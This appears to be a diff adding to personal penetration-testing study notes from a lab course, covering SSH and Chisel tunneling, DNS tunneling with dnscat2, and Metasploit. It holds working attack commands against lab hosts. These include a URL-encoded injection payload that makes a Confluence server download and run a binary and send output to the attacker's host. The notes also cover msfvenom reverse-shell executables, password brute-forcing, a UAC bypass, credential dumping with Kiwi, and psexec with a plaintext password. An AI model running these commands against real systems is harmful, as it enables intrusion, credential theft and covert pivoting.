@@ -1,3 +1,8 @@
+if DNS hangs on kali,use this tofix
+```
+service networking restart
+```
+
 ssh pattern for some machines
 ```
 ssh -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" learner@192.168.50.52
@@ -2086,6 +2091,11 @@ where ssh
 ssh.exe -V
 ```
 
+setup remote port forward
+```
+ssh -N -R 9998 kali@192.168.118.4
+```
+
 ### Plink
 Before OpenSSH was so readily available on Windows, most network administrators' tools of choice were PuTTY1 and its command-line-only counterpart, Plink. The Plink manual2:1 explains that much of the functionality the OpenSSH client offers is also built into Plink (although one notable feature Plink doesn't have is remote dynamic port forwarding).
 
@@ -2172,4 +2182,508 @@ can also delete the portproxy
 ```
 netsh interface portproxy del v4tov4 listenport=2222 listenaddress=192.168.50.64
 ```
+## Deep Packet Inspection
 
+need chisel binary on client and server 
+```
+sudo cp $(which chisel) /var/www/html/
+sudo systemctl start apache2
+```
+
+Next, we will build the wget command we want to run through the injection on CONFLUENCE01. This command will download the chisel binary to /tmp/chisel and make it executable:
+```
+wget 192.168.118.4/chisel -O /tmp/chisel && chmod +x /tmp/chisel
+```
+then use curl to execute command
+```
+curl http://192.168.50.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27wget%20192.168.118.4/chisel%20-O%20/tmp/chisel%20%26%26%20chmod%20%2Bx%20/tmp/chisel%27%29.start%28%29%22%29%7D/
+```
+
+can check apache logs for requests
+```
+tail -f /var/log/apache2/access.log
+```
+
+Now that we have the Chisel binary on both our Kali machine and the target, we can run them. On the Kali machine, we'll start the binary as a server with the server subcommand, along with the bind port (--port) and the --reverse flag to allow the reverse port forward.
+
+```
+chisel server --port 8080 --reverse
+```
+
+Before we try to run the Chisel client, we'll run tcpdump on our Kali machine to log incoming traffic. We'll start the capture filtering to tcp port 8080 to only capture traffic on TCP port 8080.
+```
+sudo tcpdump -nvvvXi tun0 tcp port 8080
+```
+
+now we want this command to connect chisel client to server 
+```
+/tmp/chisel client 192.168.118.4:8080 R:socks > /dev/null 2>&1 &
+curl http://192.168.50.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27/tmp/chisel%20client%20192.168.118.4:8080%20R:socks%27%29.start%28%29%22%29%7D/
+```
+
+however we get no connection, need to fetch error log
+```
+/tmp/chisel client 192.168.118.4:8080 R:socks &> /tmp/output; curl --data @/tmp/output http://192.168.118.4:8080/
+curl http://192.168.50.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27/tmp/chisel%20client%20192.168.118.4:8080%20R:socks%20%26%3E%20/tmp/output%20%3B%20curl%20--data%20@/tmp/output%20http://192.168.118.4:8080/%27%29.start%28%29%22%29%7D/
+```
+
+need to get chisel 1.81 binaruy 
+```
+wget https://github.com/jpillora/chisel/releases/download/v1.8.1/chisel_1.8.1_linux_amd64.gz
+gunzip chisel_1.8.1_linux_amd64.gz
+sudo cp ./chisel /var/www/html
+```
+
+force client to recopy
+```
+curl http://192.168.50.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27wget%20192.168.118.4/chisel%20-O%20/tmp/chisel%20%26%26%20chmod%20%2Bx%20/tmp/chisel%27%29.start%28%29%22%29%7D/
+```
+
+we can then re-run command and chec connection
+```
+ss -ntplu
+```
+
+SSH doesn't offer a generic SOCKS proxy command-line option. Instead, it offers the ProxyCommand configuration option. We can either write this into a configuration file, or pass it as part of the command line with -o
+
+use ncat for its proxy feature
+
+Now we'll pass an Ncat command to ProxyCommand. The command we construct tells Ncat to use the socks5 protocol and the proxy socket at 127.0.0.1:1080. The %h and %p tokens represent the SSH command host and port values, which SSH will fill in before running the command. 
+
+```
+ssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:1080 %h %p' database_admin@10.4.50.215
+```
+
+### DNS Tunneling
+In order to simulate a real DNS setup, we can make FELINEAUTHORITY a functional DNS server using Dnsmasq.9 Dnsmasq is DNS server software that requires minimal configuration. A few Dnsmasq configuration files are stored in the ~/dns_tunneling folder, which we'll use as part of our DNS experiments. For this initial experiment, we'll use the very sparse dnsmasq.conf configuration file.
+
+Now that the configuration is set, we'll start the dnsmasq process with the dnsmasq.conf configuration file (-C), making sure it runs in "no daemon" (-d) mode so it runs in the foreground. We can kill it easily again later.
+```
+sudo dnsmasq -C dnsmasq.conf -d
+```
+
+In another shell on FELINEAUTHORITY, we'll set up tcpdump10 to listen on the ens192 interface for DNS packets on UDP/53, using the capture filter udp port 53.
+```
+sudo tcpdump -i ens192 udp port 53
+```
+
+on target machine, Since DNS resolution is handled by systemd-resolved we can check the DNS settings using the resolvectl utility.
+```
+resolvectl status
+```
+
+use nslookup to get DNS info
+```
+nslookup
+```
+
+We can serve TXT records from FELINEAUTHORITY using Dnsmasq. First, we'll kill our previous dnsmasq process with a C+c. Then we'll check the contents of dnsmasq_txt.conf and run dnsmasq again with this new configuration.
+
+```
+# Do not read /etc/resolv.conf or /etc/hosts
+no-resolv
+no-hosts
+
+# Define the zone
+auth-zone=feline.corp
+auth-server=feline.corp
+
+# TXT record
+txt-record=www.feline.corp,here's something useful!
+txt-record=www.feline.corp,here's something else less useful.
+```
+
+### dnscat
+We can use dnscat21 to exfiltrate data with DNS subdomain queries and infiltrate data with TXT (and other) records.
+
+on server
+```
+dnscat2-server feline.corp
+```
+then need to move client binary to target
+
+Now we'll start interacting with our session from the dnscat2 server. Let's list all the active windows with the windows command, then run window -i from our new "command" shell to list the available commands.
+```
+windows
+window -i 1
+?
+```
+
+Since we're trying to tunnel in this Module, let's investigate the port forwarding options. We can use listen to set up a listening port on our dnscat2 server, and push TCP traffic through our DNS tunnel, where it will be decapsulated and pushed to a socket we specify. Let's background our console session by pressing C+z. Back in the command session, let's run listen --help.
+
+```
+listen --help
+```
+
+Let's try to connect to the SMB port on HRSHARES, this time through our DNS tunnel. We'll set up a local port forward, listening on 4455 on the loopback interface of FELINEAUTHORITY, and forwarding to 445 on HRSHARES (done on client machine)
+
+```
+listen 127.0.0.1:4455 172.16.2.11:445
+```
+
+now we can SMB through DNS server
+```
+smbclient -p 4455 -L //127.0.0.1 -U hr_admin --password=Welcome1234
+```
+
+## Metasploit
+```
+sudo msfdb init
+sudo systemctl enable postgresql
+sudo msfconsole
+db_status
+help
+```
+To create a new workspace, we have to provide the workspace name as argument to -a.
+```
+workspace
+workspace -a pen200
+```
+
+example nmap scan via msf
+```
+db_nmap
+db_nmap -A 192.168.50.202
+hosts
+services
+```
+
+show module categories
+```
+show -h
+```
+
+### Auxiliarry Modules
+
+show modules
+```
+show auxiliary
+```
+
+can search and filter by type
+```
+search type:auxiliary smb
+```
+
+after search we can use module number 
+info commands gives us params / descript
+```
+use 56
+info
+show options
+set RHOSTS 192.168.50.202
+```
+
+can also set options from results in db
+```
+unset RHOSTS
+services -p 445 --rhosts
+```
+
+use run command to execute
+can use vulns to get vulns detected in scan
+```
+run
+vulns
+```
+
+can also do password attack. use creds command to gather found creds
+```
+search type:auxiliary ssh
+use 15
+show options
+set PASS_FILE /usr/share/wordlists/rockyou.txt
+set USERNAME george
+set RHOSTS 192.168.50.201
+set RPORT 2222
+run
+creds
+```
+### Exploit Modules
+
+```
+search Apache 2.4.49
+use 0
+info
+```
+
+need to set our payload before running exploit
+```
+set payload payload/linux/x64/shell_reverse_tcp
+show options
+```
+
+can background a shell with ctrl-Z 
+interact with a session
+```
+sessions -i 1
+```
+
+to run an exploit in a background session
+```
+run -j
+```
+
+## Metasploit Payloads
+### Staged vs Unstaged
+
+show and set payloads
+```
+show payloads
+set payload 15
+run
+```
+
+unstaged -- all-in-one. exploit and shell code sent together
+staged -- first exploit, then send shell
+
+There are several situations in which we would prefer to use a staged payload instead of non-staged. If there are space-limitations in an exploit, a staged payload might be a better choice as it is typically smaller. In addition, we need to keep in mind that antivirus software can detect shellcode in an exploit. By replacing the full code with a first stage, which loads the second and malicious part of the shellcode, the remaining payload is retrieved and injected directly into the victim machine's memory. This may prevent detection and can increase our chances of success.
+
+### Meterpreter payload
+meterpreter commands
+```
+sysinfo
+getuid
+```
+
+inside of sessions, we can run a new shell
+```
+shell
+```
+
+this opens a new channel, which we can attach /detach
+```
+channel -l
+channel -i 1
+```
+
+commands with l prefix act on our local machine, for ex lpwd
+
+```
+upload unix-privesc-check
+```
+
+search for file 
+```
+search -f filename
+```
+
+### Executable payloads
+
+
+To get familiar with msfvenom, we'll first create a malicious Windows binary starting a raw TCP reverse shell. Let's begin by listing all payloads with payloads as argument for -l. In addition, we use --platform to specify the platform for the payload and --arch for the architecture.
+
+```
+msfvenom -l payloads --platform windows --arch x64 
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.119.2 LPORT=443 -f exe -o nonstaged.exe
+```
+
+then from Windows machine can run
+```
+iwr -uri http://192.168.119.2/nonstaged.exe -Outfile nonstaged.exe
+.\nonstaged.exe
+```
+
+note that netcat cannot handle staged payload / meterpreter, have to use `multi/handler` to setup reverse shell
+```
+use multi/handler
+set payload windows/x64/shell/reverse_tcp
+show options
+set LHOST 192.168.119.2
+set LPORT 443
+run
+```
+
+## Post-Exploitation
+### Post-Exploit Commands
+
+idletime shows how long a user has been away for
+
+ Metasploit contains the command getsystem, which attempts to automatically elevate our permissions to NT AUTHORITY\SYSTEM
+
+
+```
+shell
+whoami /priv
+exit
+getuid
+getsystem
+getuid
+```
+
+can also migrate meterpreter execution to a different process
+
+```
+ps
+migrate 8052
+```
+
+We should note that we are only able to migrate into processes that execute at the same (or lower) integrity and privilege level3 than that of our current process.
+
+Instead of migrating to an existing process or a situation in which we won't find any suitable processes to migrate to, we can use the execute Meterpreter command. This command provides the ability to create a new process by specifying a command or program
+
+```
+execute -H -f notepad
+migrate 2720
+```
+
+### Post-Exploit Modules
+Sometimes UAC prevents us from performing admin ops remotely.  Need to upgrade integrity level.
+
+Get integrity level
+```
+shell
+powershell -ep bypass
+Import-Module NtObjectManager
+Get-NtTokenIntegrityLevel
+```
+
+can background session and search for modules
+```
+^Z
+bg
+search UAC
+```
+
+One very effective UAC bypass on modern Windows systems is exploit/windows/local/bypassuac_sdclt, which targets the Microsoft binary sdclt.exe. This binary can be abused to bypass UAC by spawning a process with integrity level High.6
+
+```
+use exploit/windows/local/bypassuac_sdclt
+show options
+set SESSION 9
+set LHOST 192.168.119.4
+run
+```
+
+now recheck our shell
+```
+shell
+powershell -ep bypass
+Import-Module NtObjectManager
+Get-NtTokenIntegrityLevel
+```
+
+we can also load modules directly into existing session
+
+One great example of this is Kiwi, which is a Meterpreter extension providing the capabilities of Mimikatz. Because Mimikatz requires SYSTEM rights, let's exit the current Meterpreter session, start the listener again, execute met.exe as user luiza in the bind shell, and enter getsystem.
+
+```
+use exploit/multi/handler
+run
+getsystem
+```
+
+Now, let's enter load with kiwi as argument to load the Kiwi module. Then, we can use help to display the commands of the Kiwi module. Finally, we'll use creds_msv to retrieve LM7 and NTLM8 credentials.
+
+```
+load kiwi
+help
+creds_msv
+```
+
+### Pivoting with Metasploit
+
+first check out ip config
+```
+ipconfig
+```
+
+then reverse shell into meterpreter.
+Now that we have a working session on the compromised system, we can background it. To add a route to a network reachable through a compromised host, we can use route add with the network information and session ID that the route applies to. After adding the route, we can display the current routes with route print.
+
+```
+bg
+route add 172.16.5.0/24 12
+route print
+```
+
+if we wanted to scan whole network, set rhosts to 172.16.5.0/24 12 . but for sake of time using simplified case
+```
+use auxiliary/scanner/portscan/tcp 
+set RHOSTS 172.16.5.200
+set PORTS 445,3389
+run
+```
+
+since we have NTLM creds from previous section, can use psexec module
+```
+use exploit/windows/smb/psexec 
+set SMBUser luiza
+set SMBPass "BoccieDearAeroMeow1!"
+set RHOSTS 172.16.5.200
+set payload windows/x64/meterpreter/bind_tcp
+set LPORT 8000
+run
+```
+
+As an alternative to adding routes manually, we can use the autoroute post-exploitation module to set up pivot routes through an existing Meterpreter session automatically. 
+
+can terminate existing routes with 
+```
+route flush
+```
+
+now use auto route
+```
+use multi/manage/autoroute
+show options
+sessions -l
+set session 12
+run
+```
+
+We could now use the psexec module as we did before, but we can also combine routes with the server/socks_proxy auxiliary module to configure a SOCKS2 proxy. This allows applications outside of the Metasploit Framework to tunnel through the pivot on port 1080 by default. We set the option SRVHOST to 127.0.0.1 and VERSION to 5 in order to use SOCKS version 5.
+```
+use auxiliary/server/socks_proxy 
+show options
+set SRVHOST 127.0.0.1
+set VERSION 5
+run -j
+```
+
+then update conf file
+```
+socks5 127.0.0.1 1080
+```
+
+finally run the command
+```
+sudo proxychains xfreerdp /v:172.16.5.200 /u:luiza
+```
+
+can also use a similar technique for port forwarding
+
+```
+sessions -i 12
+portfwd add -l 3389 -p 3389 -r 172.16.5.200
+```
+
+can now run command without proxy chains
+```
+sudo xfreerdp /v:127.0.0.1 /u:luiza
+```
+
+### Resource Scripts
+can automate tasks with .rc files
+
+example
+```
+use exploit/multi/handler
+set PAYLOAD windows/meterpreter_reverse_https
+set LHOST 192.168.119.4
+set LPORT 443
+
+set AutoRunScript post/windows/manage/migrate 
+set ExitOnSession false
+run -z -j
+```
+
+then start console with 
+```
+sudo msfconsole -r listener.rc
+```
+
+can view pre-existing resources
+```
+ls -l /usr/share/metasploit-framework/scripts/resource
+```
